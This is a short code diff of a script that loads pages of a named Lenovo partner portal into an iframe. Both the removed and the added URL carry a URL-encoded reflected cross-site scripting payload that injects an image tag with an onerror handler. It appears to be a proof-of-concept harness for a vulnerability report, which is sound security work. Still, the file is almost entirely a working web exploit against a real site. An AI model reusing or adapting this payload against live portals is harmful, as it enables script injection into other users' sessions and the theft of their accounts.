@@ -8,6 +8,5 @@ frame.addEventListener("load", function() {
     }, 2000);
   }, 1000);
 });
-frame.src = "https://www.lenovopartnerhub.com/en-GB/group/morocco-site/rebate-programs?p_p_id=emeaRebateList_INSTANCE_jX1lOh6i9eO1&_emeaRebateList_INSTANCE_jX1lOh6i9eO1_gridView=&_emeaRebateList_INSTANCE_jX1lOh6i9eO1_listView=%22%2F%3e%3cimg%20src%3dq%20onerror%3Dalert%28%31%29%3e";
+frame.src = "https://www.lenovopartnerhub.com/en-GB/group/morocco-site/bid-request-old?p_p_id=com_lenovo_velocity_bid_portlet_BidRequestPortlet_INSTANCE_JAsFpbcly03b&_com_lenovo_velocity_bid_portlet_BidRequestPortlet_INSTANCE_JAsFpbcly03b_statusFilter=%22%2F%3E%3cimg%20src%3dq%20onerror%3Dalert%28%31%29%3e%2F%2F";
 document.body.appendChild(frame);
-
